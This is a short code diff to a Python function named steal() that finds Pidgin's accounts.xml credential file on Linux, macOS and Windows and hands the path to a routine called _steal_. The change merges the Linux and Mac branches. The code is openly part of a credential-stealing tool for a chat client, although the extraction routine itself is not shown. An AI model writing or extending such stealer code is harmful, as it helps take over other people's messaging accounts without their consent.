@@ -4,16 +4,13 @@ import os
 import xml.etree.ElementTree as xml
 
 def steal():
-	if platform.system() == "Linux":
-		# Set the path for Linux
-		path = os.getenv("HOME") + "/.purple/accounts.xml"
+	if platform.system() == "Linux" or platform.system() == "Darwin":
+		# Set the path for Linux and Mac
+		path = os.path.expanduser('~/.purple/accounts.xml')
 	elif platform.system() == "Windows":
 		# Set the path for Windows
 		path = os.getenv("APPDATA") + "\\.purple\\accounts.xml"
-	elif platform.system() == 'Darwin':
-		path = os.path.expanduser('~/.purple/accounts.xml')
 	else:
-		# Mac isn't supported now
 		return("[-] "+platform.system()+" is not supported.")
 	# Call the function
 	return _steal_(path)
